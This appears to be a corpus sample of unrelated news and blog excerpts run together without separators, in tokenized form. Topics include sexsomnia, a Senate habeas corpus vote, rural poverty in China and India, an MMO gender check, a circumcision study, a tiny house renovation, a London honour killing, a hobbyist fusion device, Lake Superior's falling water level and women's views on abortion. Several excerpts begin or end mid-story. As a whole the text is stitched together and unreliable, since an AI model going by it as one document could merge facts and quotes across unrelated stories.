But “ for whatever reason , sexual behaviors become part of the repertoire . ”
While people might feel ashamed to learn from their partners that they are exhibiting these behaviors while they sleep , these disorders are not indicative of psychological problems , noted Schenck , whose recently published book , Sleep : The Mysteries , The Problems , and The Solutions , has a chapter devoted to sex-related problems .
“ Bizarre and inappropriate behavior during sleep does not necessarily reflect a daytime psychological problem . ”
And “ sexsomnia ” disorders are easily treated with medication , he added .
If anything , people who become aware of their problem but do n’t seek help put themselves at an even greater risk .
“ The longer you go with this problem without getting it treated , the more you can then develop a secondary psychological problem , ” such as depression , said Schenck , whose study is published this week in the journal Sleep .
WASHINGTON , Sept. 19 — A move to give terrorism suspects the right to challenge their detentions in federal court fell short in the Senate today , even though it had majority support .
Fifty - six senators voted to cut off debate , and move forward to a vote on the bill itself , a step known as cloture .
But under Senate rules , 60 votes are needed to invoke cloture .
Some supporters of the bill said they might bring it up again , although it was not clear just when .
The cloture vote had been expected to fail , but the result did nothing to quell the debate over the proper balance between national security and personal liberty .
“ The truth is that casting aside the time - honored protection of habeas corpus makes us more vulnerable as a nation because it leads us away from our core American values , ” said Senator Patrick J. Leahy , Democrat of Vermont , a co-sponsor of the measure with Senators Arlen Specter , Republican of Pennsylvania , and Christopher J. Dodd , Democrat of Connecticut .
Mr. Leahy is the chairman of the Senate Judiciary Committee and Mr. Specter the committee ’s senior Republican ; both are former prosecutors .
Asia 's peasant problem
China and India face a crisis if they do n't share their new wealth .
( FORTUNE Magazine ) - Overlooked in the daily rush of news about China 's and India 's stunning economic growth is a mammoth - scale economic problem - which neither country can any longer avoid .
It 's this :
Most of their people have n't participated in the boom .
A majority of people in the world 's most populous countries ( China 's total population : 1.3 billion ; India 's : 1.1 billion ) have watched fellow citizens vault ahead of them to prosperity and even serious wealth .
And the left - behinds do n't want to take it anymore .
The conflict can be tough to spot in China .
On my latest trip I walked quickly through Shanghai 's sweeping new airport and got into the hotel Audi , which carried me along an eight - lane highway to the district of gleaming skyscrapers and new four - star restaurants .
What you do n't see , unless you go looking for it , is rural China - 800 million people , many of whom struggle to feed themselves .
Battling for subsistence is something they can deal with .
What they can't stand is when China 's economic expansion makes them worse off .
The increasingly common pattern is that entrepreneurs pay the government to use large tracts of farmland for factories , shopping malls , and such .
Most of the money is supposed to go to the farmers who work the land ( but can not own it under Chinese law ) .
Instead , local officials often pocket the cash , leaving the farmers with no money and no land .
Farmers ' fury began boiling over last year and has continued into this spring , with thousands of protests nationwide , some of which resulted in protesters being killed by police .
Chinese authorities have tried to quash news reports of the uprisings but clearly take them seriously .
Prime Minister Wen Jiabao said in the government media , " We absolutely can't commit a historic error over land problems . "
The term " historic error " is significant in Chinese politics , referring to the most serious mistakes .
In contrast to China , seeing the rich - poor divide in India is deceptively easy .
When I recently stepped out of Mumbai 's fanciest hotel - and very nice it is - I was accosted within moments by street kids pulling on my arm asking for money as I tried not to trip over the mangy dogs that seem to be everywhere .
The scene is deceptive because it does n't show you the most serious poverty , which again is rural .
Farmers are 60 % of India 's workforce but produce only 20 % of its minuscule per capita GDP .
Hundreds of millions of Indians survive on less than $ 1 a day .
Nearly half of all Indians , and most Indian women , are illiterate .
All those software writers , microchip designers , X - ray readers , bond analysts , call - center operators , engineers , and other service providers we read about , although numbering in the millions , are a small percentage of the population .
Poor farmers were key in the election of Prime Minister Manmohan Singh , who in April put a startling idea on the table : Companies should voluntarily adopt an affirmative - action program to make their workforces " broad - based and representative , " which in India means including members of certain castes and tribes that have historically been excluded from advancement .
Indian executives , suspecting they spied a looming government mandate , responded bluntly :
No way will we be required to do this .
But they quickly began publicizing their existing training programs and announced an " affirmative - action task force . "
What will happen next in China and India seems clear .
Indian industry will jack up its efforts to educate , train , and eventually hire more of the poor , spurred by the implicit threat of government requirements .
China will spend more on integrating the rural poor into the industrial economy , though many just are n't ready for it .
Near term , that 's inefficient for both countries .
They 'll be spending money they 'd rather not because they 're afraid of what might happen if they do n't .
But less efficient Chinese and Indian economies are hardly good news for American workers , because of what happens next : Perhaps a billion new participants enter the global labor force - rural poor who have been economically invisible so far .
There 's evidence that the large numbers of manufacturing and service workers in China and India have already been holding U.S. wages down .
The hard truth is , we ain't seen nothin ' yet .
FEEDBACK gcolvin@fortunemail.com
Aurora Technology , a subsidiary of Chinese entertainment company Shanda , has reportedly frozen the accounts of men playing female characters in its MMO King of the World .
Players who choose female in - game avatars must prove their gender via webcam in order to be granted access to the game .
Setting aside for just a moment the fact that being able to play as a girl is a major reason many guys play MMOs in the first place , this procedure is a joke .
The only thing it verifies is that the person with the account a ) knows a female , and b ) persuaded them to sit in front of a webcam for a few minutes .
The policy makes no practical sense and is an invasion of privacy to boot .
Hopefully it will be short - lived .

A few weeks ago , the Bounty Fishing blog came out with an excellent and well - thought - out blog post about 27 Aquatic Lifeforms You Never Caught While Fishing .
The story did quite well on Digg and on Reddit , with Reddit users noticing that one of the fish forms actually looked very much like the Reddit logo .
So what did Reddit founder Alexis Ohanion do ?
He changed the Reddit logo to that aquatic lifeform for several hours .
That story hit the front page of Reddit and on Digg , and 67 people voted on my comment :
Props to Reddit for visibly interacting with the community it serves .
Beyond the cool factor , Reddit is easily getting new users by paying attention to its user base and even creating surprises when not even necessary .
( And Reddit does n’t stop there . )
It ’s great to build a self - sustainable social network and then be able to sit back and relax while the users run the show .
It ’s even better when you take part in the everyday details of your site and focus on your user ’s experience .
Not long ago , I wrote about how 17 - year - old Andrew Sutherland was doing this on Quizlet .
His site is successful on its own , but his involvement makes the user experience all the more enjoyable .
Just a few weeks ago , I posted about how Kevin Rose was Digg ’s brainchild and that his vision probably differs from the vision of the top users .
I understand that Digg founders have other projects , but that should not preclude the Digg founders from being more involved in the online services that they helped build .
It would help them understand where their users are coming from when we ask for more transparency .
It would help if there was more communication , like warnings on the site before scheduled downtime .
( I ’ve asked for that before , Mr. Rose . )
It would help prevent posts like these .
Better yet , the fact that they show that they listen ( beyond for damage control purposes ) would be a wonderful thing .
How much does circumcision alter what a man ultimately feels ?
Scientific studies aiming to answer this question have been inconclusive .
Now researchers prodding dozens of male penises with a fine - tipped tool have found that the five areas most receptive to fine - touch are routinely removed by the surgery .
The finding , announced today , was detailed in the April issue of the British Journal of Urology ( BJU ) International .
Circumcision surgery involves the removal of the skin that covers the tip of the penis , called the foreskin .
Infant male circumcision is the most common medical procedure in the United States , with an estimated 60 percent of male newborns undergoing the surgery .
Morris Sorrells of National Organization of Circumcision Information Resources Center and colleagues created a “ penile sensitivity map ” by measuring the sensitivity of 19 locations on the penises of 159 male volunteers .
Of the participants , 91 were circumcised as infants and none had histories of penile or sexual dysfunction .
For circumcised penises , the most sensitive region was the circumcision scar on the underside of the penis , the researchers found .
For uncircumcised penises , the areas most receptive to pressure were five regions normally removed during circumcision — all of which were more sensitive than the most sensitive part of the circumcised penis .
Circumcision is a procedure practiced in several countries for medical as well as cultural reasons .
Most scientists agree that the surgery confers some protection against infection and the risk of contracting sexual diseases .
Recent studies have also shown that circumcision can lower the risks of HIV infection by as much as 60 percent in sex between males and females .
But Robert Van Howe , a study team member at Michigan State University , thinks such claims are somewhat overblown .
“ The [ health benefits ] that have been consistently shown are very small , and there are less aggressive , less invasive , less expensive ways of dealing with the problems [ circumcision ] is supposed to address , ” Van Howe told LiveScience .
Other practices , such as choosing sexual partners wisely and using condoms consistently , are far more effective in protecting against diseases , he added .
Circumcision is opposed by some groups on the grounds that it is painful and not a life - saving procedure , and that it also makes sex less pleasurable by exposing and numbing the tip of the penis , called the glans .
Some have gone so far as recommending foreskin restoration .
Some previous studies found that circumcision led to little , if any , decrease in penile sensitivity , but Sorrells and his colleagues say such findings are suspect because many are based on self - reports from men who were circumcised to correct medical problems .
Cottage industry / Renovation of a tiny - wait , make that minuscule -- house in Pacifica turns its owner into a specialist in compact living

Dirk Dieter collects old kitchen appliances and car bumpers , which would warrant a " so what ? " except that his entire house is n't as big as many kitchens , and his garage functions as his only closet .
In 1999 , the industrial and exhibit designer paid $ 101,000 for the 250 - square - foot Pacifica house built on a triangular lot along dead - end Short Street in 1954 .
In the old days , it most likely was a warming shed for local fishermen , but Dieter envisioned an affordable entry into the hot California real estate market .
Recently , he completed a modest but dramatic renovation that inspired him to formulate strategies and design furniture ( www.verb2.com) for streamlined living .
The strategies did not include expansion .
Well , OK , Dieter added 20 square feet to the house for a more formal entry and a laundry nook .
And he built on a 224 - square - foot garage , so he could keep the house clutter - free while he trained himself to live a simpler life .
" This house has an interesting history of people who lived here , trying to live very humbly and inexpensively , " Dieter , 47 , said as he guided an understandably short tour of the property , the outside of which is distinguished by a coastal cypress tree in the yard and a Kelly - Moore Bergamot Orange door in the entry .
" There was a guy with no shower who used a dump bucket .
I do n't think it was ever Sheetrocked at all : I found inside the walls newspaper from the '70s .
It had been repossessed , foreclosed on , and I bought it from the bank and redid most of the work . "
It did n't take long for Dieter , who grew up in a four - bedroom house in Berkeley , to learn the pitfalls of living in the little place on Short Street .
For years , neighbors had taken to cutting through his yard to get to the park at the end of his street ; he redid the fence .
Humidity and smoke took a large toll on his confined space ; he designed and installed a custom range hood .
And contractors seemed to giggle at him when he asked for bids , which was compounded by the fact that living in a house during construction is bad enough when the house has more than one room to begin with , and his did n't .
But he managed to open up the floor plan , demolishing the wall that had closed off the kitchen and creating a chef 's haven with what remained .
He kept the small stove and fridge , put horizontal - grain doors on the cabinets to widen the look of the space , and installed two sinks , figuring he could always top one with a cutting board if he needed more counter space .
The lights are covered in bent acrylic that TAP Plastics manipulated to his specifications , and overhead there 's room for a few of those old kitchen gizmos .
A black Corian counter , sanded and oiled , doubles as a dining table and barrier to Dieter 's work space .
" I definitely do n't want people in the kitchen , but I do want them helping me , " he said .
A refi allowed him to add the garage .
" Part of simplifying life is not having a huge mortgage -- some people work for their house , " he said .
" The only burden , really , is keeping things neat .
It really helps to have a garage -- mentally and physically -- to throw things in there and get them off my mind .
" People wondered why I did n't want to build more living space , but I seriously needed that ( garage ) space during construction for materials , and now it 's where the junk resides .
My car has been in there maybe two times . "
( It 's a small car , by the way , a green Metro . )
If having a garage or some other designated chaos space qualifies as Chapter 1 in the Dieter textbook on living large in a small space , there are some other chapters he might include :
-- Nix doors that swing .
Find cabinets with sliding doors , and use curtains or shades to partition off space .
( Dieter 's " laundry room " is a nook stashed behind a natural - fiber shade . )
-- Multipurpose furniture , such as Dieter 's futon , and folding furniture , especially chairs , add flexibility .
These pieces do not have to be ugly ; Dieter has found modern and comfortable chairs at Ikea and Design Within Reach .
--
Put furniture on rollers for easy cleaning and access to partitioned areas .
Some rollers come with brakes or locks , providing stability for beds and couches .
-- Build into the walls to create nooks and display areas , but do n't build into the room with molding , baseboards or even door and window frames .
Even carpet intrudes on space ; Dieter used bamboo on his floors .
" Basically , everything that comes into the room , I 'm taking away , " he said .
-- Make cardboard prototypes for possible additions to make sure they 'll fit into the scheme of everyday life .
Dieter even put up a mockup of his range hood to confirm that yes , it really did need to be just 3 inches deep to ensure that it would n't regularly meet with his head .
-- Think vertically .
Narrow spaces between cabinets and appliances create storage for pans and cutting boards .
An Ikea accessory that affixes to the ceiling and floor provides a full - length mirror and hat or coat hooks .
Dryer stacks atop washer .
Along those lines , Dieter came up with a pair of original designs .
One is the rolling , 77 1/2 - inch - tall Tower of Power for audio - video equipment , a vertical stack of home entertainment storage with a power strip along the back ; his is made of maple and tinted acrylic and can be duplicated for $ 1,025 or customized in various materials and specifications .
The other is the rolling , 69 - inch - tall Clothes Tower , an off - the - shelf aluminum bun rack with eight drawers in 1/2 - inch Russian birch that holds all of his clothes that are n't hanging .
It 's $ 875 -- " not Ikea prices , but not Design Within Reach , either , " Dieter said , " and well made to last a lifetime . "
His latest piece is a hanging storage cube , to serve as a nightstand next to a bed or lamp table next to a sofa , or as both next to a convertible sofa .
" It 's like the old college thing , where you build up the bed and put things below it , " he said .
" The thing for me has been , keep it light and airy . "
So far , so good .
The last time Dieter had his little pad appraised , it was valued at $ 375,000 .
Of course , he noted , " You have to find somebody to buy it .
I think it will be a good rental . "
Good thought .
Although he 's managed to have as many as eight people over at one time , it 's not as if anyone would want to live there with him , not even his girlfriend , Yvonne O'Brien of Aptos .
" I have a small house , but that is a really small house , " she said .
" When I first went over , I was impressed by the garden , the yard , the way it was laid out -- you feel like you have more room than you think because it 's not cluttered .
He 's made it very comfortable .
I 've stayed for weekends with my dog ( border collie Pi ) and we 've never bumped into each other . "
As the saying goes , it 's a nice place to visit but ...
" It 's fine for a weekend , but to live there , no , " she said .
" Just my clothes alone would fill it . "
Well , she could always stash them in the garage .
Dieter did have that part of the structure engineered to allow for the possibility that a second story could someday be placed on top .
WASHINGTON -- Federal officials have disobeyed at least six new laws that President Bush challenged in his signing statements , a government study disclosed yesterday .
The report provides the first evidence that the government may have acted on claims by Bush that he can set aside laws under his executive powers .

DeLay spokesman denies he wanted House Clerk fired for being gay RAW STORY
Published : Thursday June 7 , 2007 Print This Email This Although an ex- House Clerk claims that Tom DeLay had sought his termination for being gay , a spokesman for the indicted former Republican Congressman from Texas denied the story to a Capitol Hill newspaper .
" Jeff Trandahl , the gay former clerk of the U.S. House of Representatives , broke his public silence on the Mark Foley scandal last week in brief remarks , " reported in Wednesday 's Washington Blade .
" Speaking on a panel discussion related to gay rights on the first all - gay trans -Atlantic crossing aboard the Queen Mary 2 , Trandahl said he had ' dozens ' of confrontations with Foley over the years . "
The article continues , " As clerk from 1998 through November 2005 , Trandahl had oversight authority over the page program .
House investigators have said Trandahl repeatedly urged staff members of House GOP leaders to rein in Foleys inappropriate behavior . "
The Blade also reported Trandahl claimed that " DeLay ( R - Texas ) had long sought to oust him from the job because he is openly gay . "
However , Thursday 's Roll Call reports , " A spokeswoman for DeLay dismissed the charge that her boss wanted to sack ( that is , fire ) Trandahl . "
" We have no idea where this comes from , but its a very serious accusation and an outright lie , " the spokeswoman said .
Excerpts from Roll Call article : # Trandahl , who was Clerk from 1998 to 2005 and who had warned Foley about his contact with Congressional pages  the root of the scandal that led to Foleys humiliating resignation last year  praised former Speakers Dennis Hastert ( R - Ill . ) and Newt Gingrich ( R - Ga. ) as well as current Speaker Nancy Pelosi ( D - Calif . ) for supporting him during his tenure ,  according to the Blade article .
But he singled out DeLay for criticism .
Trandahl is now the executive director of the National Fish and Wildlife Foundation .
A former GOP leadership staffer who served during DeLay and Trandahls tenure seemed surprised by Trandahls claim that DeLay wanted him fired , doubting that he was even aware the former Clerk was gay .
 No member of Congress has a worse gaydar than Tom DeLay ,  the former aide said .

Here , her sister , who narrowly escaped death herself and now lives in fear of her life , breaks her silence .
Every time Bekhal Mahmod leaves the safety of her home , she wears the hijab with a black veil covering her face - even though she would give anything for the freedom not to have to .
Scroll down for more
She has no family to turn to , few friends , and has to lie to new acquaintances about who she is and where she is from .
She is constantly looking over her shoulder .
" My life will always be at risk , " says 22 - year - old Bekhal .
" There are people in my community who want to see me dead , and they will not rest until I am .
I will never be safe .
I wear the veil so no one can recognise me . "
It is a desperately lonely and isolated existence , but at least she is alive - unlike her younger sister Banaz .
Both young women brought " shame " on their strict Muslim Iraqi Kurdish family by disobeying their father Mahmod .
Bekhal , 22 , ran away aged 16 rather than agree to an arranged marriage to a cousin in Iraq .
She survived an attempted killing by her brother , but her sister Banaz , 20 , paid the ultimate price for leaving her own arranged marriage and then falling in love with an " unsuitable man " of her own choice .
On the orders of her 52 - year - old father and uncle , Ari Mahmod , 50 , she was strangled with a bootlace by Kurdish assassins , her body stuffed in a suitcase and buried six feet down in the garden of a house belonging to an associate in Birmingham .
Scroll down for more
Two of the murderers , who fled back to Iraq after this horrific so - called " honour killing " , have since boasted of raping Banaz before she died in January 2006 .
" Honour killing ? " cries Bekhal .
" Where is the honour in a father putting his status in the community before the life of his own flesh and blood ?
" They should be disgusted with themselves .
Honour in our community is about men having the upper hand , having the ruling power .
" Banaz was the most beautiful , loving , caring , easy - going girl you could ever hope to meet .
Her only crime was to want to have some say in her life .
Where is the shame in that ?
" After I refused an arranged marriage , I knew I had two choices ; stay and be killed , or leave and live .
I chose to live but I had to leave everything behind . "
Bekhal was one of the key prosecution witnesses at the three - month trial of her father and uncle , which this week resulted in their convictions at the Old Bailey for murder .
They have yet to be sentenced .
A third man , Mohamad Hama , 30 , of South Norwood , London , had already admitted the killing .
The other key witness was Banaz 's boyfriend Rahmat Sulemani , 29 , whose own life was threatened because he was considered an unsuitable match for Banaz , despite also being Iraqi .
Bekhal and Rahmat now face a future of secret addresses and identities under police protection .
" When I stared into the eyes of my father in court , there was n't even a twitch of guilt , " says Bekhal .
" No emotion at all .
I still love him because he is my father , but I can never forgive nor understand what he did .
" Why , if he did n't want us to be influenced by Western ways , did he bring us to Britain ?
You can not expect your children to follow the same traditions as back in Iraq .
" It is an impossible expectation .
This would never have happened back there because we would have known no different . "
Bekhal has shown incredible bravery in giving evidence against her father and speaking out now in her first major interview , for the threat of reprisals is very real .
She is believed by British police to be the first female family member ever to give evidence in an " honour killing " trial .
Indeed , her mother and three other sisters refused to cooperate with the police for fear of upsetting the community .
" Why should we have to die for wanting no more than for our voices to be heard , to have a say in our lives ? "
Bekhal says .
For it seems that it is women who are the main casualties when some ultra-traditional immigrants are determined to protect their own culture , even if it means operating above the law .
According to Bekhal , integration was the very last thing on her father 's mind , although she says he seemed happy to accept Britain 's hospitality in the form of a council house and benefits .
Despite being relatively well - off back in Iraq - his family were property owners and ran various businesses - he never worked here .
His status in the community and the respect of Iraqi Kurds were all that mattered to him .
Bekhal was 14 and Banaz 12 when they first arrived in England , as asylum seekers fleeing Saddam Hussein 's Iraq , with their parents Mahmod and Behya , brother Bahman , now aged 28 , and sisters Beza , 25 , Payman , 20 , and Giaband , 16 .
Having moved into a council house in Mitcham , South London , Mahmod 's daughters , who could n't speak a word of English , were enrolled at the local Bishopsford Community School .
Inevitably problems started almost immediately as Bekhal began to learn the language and made friends with Western boys and girls .
She started to envy their freedoms , to the evident fury of her father .
The more Westernised his daughters tried to become , the more he tried to control them , often resorting to verbal abuse and violence .
" We used to have to wear a headscarf and trousers to school , which was so hot , " Bekhal recalls .
" I did n't want to wear mini-skirts or makeup like some of the girls , but I longed to take my headscarf off .
" One day I was walking home through the park and I 'd taken my scarf off and my father saw me .
He screamed at me : ' Who do you think you are ?
You are acting like a bitch . '
" He pulled me inside the house , spat in my face and then picked up his slippers to beat me around the head as he shouted : ' Do n't you ever disobey me . '
In the two years before I ran away , I think he beat me more than 20 times .
" It would be over silly things like undoing the top button of my school shirt , or using hair gel .
Once , he picked up a metal soup ladle and hit me round the head repeatedly with it .
" I did n't want to have boyfriends or go out at night or anything like that .
I was respectful to my parents .
" I just wanted to be able to have friends , to give my opinion , very small things that British girls take for granted . "
Bekhal left school after taking her GCSEs and took a part - time job working in a supermarket .
All her earnings - around £ 300 a month - were taken by her father ; she was given just £ 50 from it .
" One day I was walking home from work and a male colleague was walking beside me , pushing his bike along , " she says .
" All of a sudden my father drove up .
My friend leapt on his bike to cycle off and my father tried to run him over .
Back home after that I was beaten again .
" When I used to confide in friends what was happening to me , they used to accuse me of exaggerating .
" They could n't believe that such things could go on in today 's society .
They thought there were laws to prevent it , but they do happen and there are many other women still suffering .
" It is not a cultural issue .
It is criminal and people need to take it seriously . "
Bekhal first ran away when she was 16 and went to live with a schoolfriend .
Her parents tracked her down and after countless threats she reluctantly agreed to return home .
The second time , she ran away after she was locked for a week in a bedroom for refusing to accept an arranged marriage with a cousin , calling the police to rescue her after escaping her confines while the rest of the family were out .
She was placed in foster care by social services , but again , reluctantly went home after a few months .
" My parents again tracked me down and kept sending me audio tapes .
At first they would be tearful , with my dad calling me his ' little rose ' .
" Then they became more menacing .
My father told me that unless I went home he would kill all my sisters first , then my brother , then my mother , then himself , such was the shame I had brought on them .
" I believed him , so I went back .
Did I think he was capable of doing that ?
Absolutely . "
The beatings continued , as did the demands that she agree to marry her cousin .
" I kept repeating ' I will not do it ' .
I could not agree to marry some stranger and live an unhappy life . "
It was when Bekhal ran away for a third time - returning to her foster mother - and found herself a Muslim boyfriend , who was not strict in his religion , that Mahmod decided he could not allow her to live .
During Banaz 's murder trial , the court heard how Mahmod dispatched his only son Bahman to restore the family 's honour by killing Bekhal .
Bekhal recalls how her brother lured her to meet him at a remote spot in South London , with promises of money , and then hit her round the head with a dumb - bell while her back was turned .
" I felt this terrible pain in my head and collapsed , " recalls Bekhal .
" Blood was streaming down my face .
" I felt dizzy and sick , but I looked up at him and said : ' What are you doing ? '
He was crying like a baby and kept repeating : ' I 've got to do it , you have brought shame on the family .
It is my duty . '
" As he started to drag me across the gravel I was pleading : ' Please do n't do this , I will do anything , just tell my father you killed me and let me go , you will never hear from me again . '
" Thankfully for me , he could n't go through with it .
He put his hand in his pocket and gave me six £ 50 notes before telling me to go .
I phoned my boyfriend , screaming hysterically : ' Please come and get me , my brother 's trying to kill me . '
Bekhal was taken to hospital where she received several stitches to her head , but she refused to inform the police or press charges , because - despite herself - she did n't want to shame her family by involving the authorities .
From then on , she occasionally phoned her sisters in secret , careful not to tell them where she was living .
Some months later , she learned that her younger sister Banaz , unlike her , had agreed to an arranged marriage when she was 17 to a Midlandsbased Kurdish man , then aged 28 , whom her father described as " the David Beckham " of husbands .
But the marriage was a disaster .
Banaz , the court would later hear , fled home after two - and - a - half years complaining that her husband was violent , regularly beating her .
" I remember going to see Banaz in secret when she was married and she was terribly unhappy , " Bekhal recalls .
" She finally understood why I had run away .
I told her she could come and live with me , but she said she could n't bring further shame on the family .
She later told me she only put up with her husband for so long because she wanted to keep our father happy . "
What a bitter irony that this young girl continued to try to please the man who would later take her life .
Back home with her family , Banaz was not yet divorced when she met Rahmat Sulemani , from South London , at a family party in 2005 .
For a long time they were just good friends before falling in love , but Mahmod did not approve .
Rahmat - despite being a family friend - was not from the same village and not as religious as the Mahmods .
He was warned off with threats to his life .
Banaz , 20 , was taken to a relative 's house in Sheffield , where she was locked up for two weeks and beaten .
When that did not work , a family meeting was called by Banaz 's uncle , Ari Mahmod , a wealthy entrepreneur who ran a money transfer business , where it was decided to kill the couple unless they stopped seeing each other .
But Banaz and Rahmat , whose occupation has never been revealed to protect him , and who now lives under an assumed name , continued to meet in secret .
Their fate was sealed when a member of the Kurdish community pictured them kissing in the street in Brixton on his mobile phone .
The first attempt on Banaz 's life was on New Year 's Eve 2005 , when she was taken to her grandmother 's house in Wimbledon and plied with brandy by her father , who then came towards her , arms outstretched wearing surgical gloves , as she fought off sleep .
She ran out through the back door when her father briefly left the room , and broke a neighbour 's window to try to raise the alarm , cutting her wrists in the process .
The police were called , but the female officer who interviewed her , PC Angela Cornes , did n't believe her .
She dismissed Banaz as an attention seeker and even considered charging her with criminal damage for breaking the window .
It was left to Banaz 's boyfriend Rahmat to record on his camera phone her chilling testimony , explaining - as she lay in hospital - what had happened and describing how she was " really scared " for her life .
This was played to the jury during the murder trial .
PC Cornes is one of five police officers under investigation in an internal review by Scotland Yard over the handling of the case , for it emerged during the trial that Banaz had told police on at least four occasions that her family was plotting to kill her .
Yet , crucially , she declined the police offer of a place at a refuge , believing no harm would come to her while at home with her mother .
Mahmod never reported his daughter missing to police after she suddenly vanished in January 2006 .
It was left to Rahmat Sulemani to do that .
When the police first called at the family home on the day she was murdered - January 24 -
Mahmod fobbed them off , saying she was out .
Two days later they classed her as high - risk after the family refused to report her missing and launched a full - scale investigation .
Bekhal describes the day she was told by police that her sister 's body had been found buried half - naked in a garden - three months after her death - as the very worst of her life .
" What they did to my sister was devilish , despicable and disgusting .
Can a family 's honour be worth more than a life ?
I can't bear to think of the way she must have suffered .
I had no choice but to stand up in court and give evidence for her . "
Today , Bekhal has no contact with her mother , brother or sisters .
She cannot risk any communication , in case her new whereabouts under police protection is inadvertently revealed .
More importantly , however , she does not want to put them at risk from the Kurdish community for associating with her .
" I would rather live like this than live in fear , " says Bekhal .
" I will never be able to tell people who my father is - not only because of the risk to my life but because I 'm ashamed .
He is the one who has brought dishonour to our family . "
U of M will bring more courses on campus Monday
U of M had initially planned the partial reopen for mid-September , but delayed after two COVID - 19 clusters were announced .
It ’s staring to feel like a theme week .
[ Eric ] reminded me of this 17 year old who built his own fusion reactor .
Being me , I had to look around for more .
I found the open source fusor research consortium .
I found plans , research , and this fusor built by Richard Hull .
It ’s his fourth version – definitely worth checking out .
Essentially , all the atmospheric air is removed via vacuum .
Then you add a bit of deuterium gas , some high voltage and if you got it right , bask in the glow of your own personal fusion reaction .

Facebook MARQUETTE , Mich . 
Deep enough to hold the combined water in all the other Great Lakes and with a surface area as large as South Carolina , Lake Superior 's size has lent it an aura of invulnerability .
But the mighty Superior is losing water and getting warmer , worrying those who live near its shores , scientists and companies that rely on the lake for business .
The changes to the lake could be signs of climate change , although scientists are n't sure .
Superior 's level is at its lowest point in eight decades and will set a record this fall if , as expected , it dips three more inches .
Meanwhile , the average water temperature has surged 4.5 degrees since 1979 , significantly above the 2.7 - degree rise in the region 's air temperature during the same period .
That 's no small deal for a freshwater sea that was created from glacial melt as the Ice Age ended and remains chilly in all seasons .
A weather buoy on the western side recently recorded an " amazing " 75 degrees , " as warm a surface temperature as we 've ever seen in this lake , " said Jay Austin , assistant professor at the University of Minnesota at Duluth 's Large Lakes Observatory .
Water levels also have receded on the other Great Lakes since the late 1990s .
But the suddenness and severity of Superior 's changes worry many in the region .
Shorelines are dozens of yards wider than usual , giving sunbathers wider beaches but also exposing mucky bottomlands and rotting vegetation .
On a recent day , Dan Arsenault , a 32 - year - old lifelong resident of Sault Ste. Marie in Michigan 's Upper Peninsula , watched his two young daughters play in mud on the southeastern coast where water was waist deep only a few years ago .
A floatation rope that previously designated the swimming area now rests on moist ground .
" This is the lowest I 've ever seen it , " said Arsenault .
Superior still has a lot of water .
Its average depth is 483 feet and it reaches 1,332 feet at the deepest point .
Erie , the shallowest Great Lake , is 210 feet at its deepest and averages only 62 feet .
Lake Michigan averages 279 feet and is 925 feet at its deepest .
Yet along Superior 's shores , boats can't reach many mooring sites and marina operators are begging the U.S. Army Corps of Engineers to dredge shallow harbors .
Ferry service between Grand Portage , Minn. , and Isle Royale National Park was scaled back because one of the company 's boats could n't dock .
Sally Zabelka has turned away boaters wanting to dock at Chippewa Landing marina in the eastern Upper Peninsula , where not long ago 27 - foot vessels easily made their way up the channel from the lake 's Brimley Bay .
" In essence , our dock is useless this year , " she said .
Another worry :
As the bay heats up , the perch , walleye and smallmouth bass that have lured anglers to her campground and tackle shop are migrating to cooler waters in the open lake .
Low water has cost the shipping industry millions of dollars .
Vessels are carrying lighter loads of iron ore and coal to avoid running aground in shallow channels .
Puffing on a pipe in a Grand Marais pub , retiree Ted Sietsema voiced a suspicion not uncommon in the villages along Superior 's southern shoreline :
The government is diverting the water to places with more people and political influence — along Lakes Huron and Michigan and even the Sun Belt , via the Mississippi River .
" Do n't give me that global warming stuff , " Sietsema said .
" That water is going west .
That big aquifer out there is empty but they can still water the desert .
It 's got to be coming from somewhere . "
That theory does n't hold water , said Scott Thieme , hydraulics and hydrology chief with the Corps of Engineers district office in Detroit .
Water does exit Lake Superior through locks , power plants and gates on the St. Marys River , but in amounts strictly regulated under a 1909 pact with Canada .
The actual forces at work , while mysterious , are not the stuff of spy novels , he said .
Precipitation has tapered off across the upper Great Lakes since the 1970s and is nearly 6 inches below normal in the Superior watershed the past year .
Water evaporation rates are up sharply because mild winters have shrunk the winter ice cap — just as climate change computer models predict for the next half - century .
Yet those models also envision more precipitation as global warming sets in , said Brent Lofgren , a physical scientist with the Great Lakes Environmental Research Laboratory in Ann Arbor .
Instead there 's drought , suggesting other factors .
Cynthia Sellinger , the lab 's deputy director , said she suspects a contributing factor could be residual effects of El Nino , the warming of equatorial Pacific waters that produced warmer winters in the late 1990s , just as the lakes began receding .
Austin , the Minnesota - Duluth professor , said he 's concerned about the effects the warmer water could have .
" It 's just not clear what the ultimate result will be as we turn the knob up , " he said .
" It could be great for fisheries or fisheries could crash . "

Yesterday in the Mail , Amanda Platell argued that the current 24 - week limit should be cut .
But what do women who have had abortions think ?
Here , seven of them give their views . . .
REGRETS
Sarah Giles , 27 , works in sales for a computer company .
She lives with her boyfriend , Mike , 29 , an estate agent , in Northampton .
She says :
I think the abortion limit should definitely be reduced to 13 weeks .
I was only six weeks pregnant when I had my abortion , and even then I had bonded with my baby .
Seeing the foetus on the scan - which you have to have before they will carry out the procedure - was unbearably moving .
It was two years ago and I have n't been the same since .
I 'd been going out with Mike for a year and a half when I got pregnant .
We were n't using contraception and he freaked out .
He said we did n't have the money , that it was too soon in our careers , and it would ruin our lives .
At the time , I agreed .
My parents divorced when I was young and I hardly saw my father , and that 's not what I wanted for my child .
I wanted to be married , in a stable , loving relationship , with plenty of money .
We agreed that I would have an abortion , but I was unprepared for how I would feel about my baby , and about how I would be treated at the clinic .
There were about 20 of us in at the same time , and we were herded about like cattle .
It was horrible .
I had a general anaesthetic , but when I came round I was lying on a recliner chair surrounded by the other girls in the waiting room , many of them sobbing hysterically .
It was like a scene from hell .
There was pop music blasting out from the office , and the staff were chatting loudly , ignoring us .
All I could think was : " Get me out of here . "
Scroll down for more
After an hour , I was allowed to go home .
My boyfriend drove me back as I sobbed helplessly .
I was bleeding heavily , and two days later I was still in pain and bleeding .
A month after the abortion , I went to my GP to get antidepressants .
I could n't sleep - I felt awful .
Today , I still have a huge sense of loss and feel that we did the wrong thing .
Mike and I are still together , although the abortion nearly split us up .
I hope that one day we 'll get married and have children together - but I will never forget .
Even today , I see pregnant women or happy young mothers with their babies and think : " That could have been me .
It makes me cry .

Jenny Watson , 33 , is an accountant .
She lives in London with her partner , Andrew , 33 , an IT executive .
She had an abortion in January 2005 .
She says :
I fell pregnant at the worst possible time .
Having worked for years to establish my career , the last thing I wanted was a child .
All through my 20s I 'd saved up to buy my flat , and for the first time in years I was able to go out and buy little luxuries .
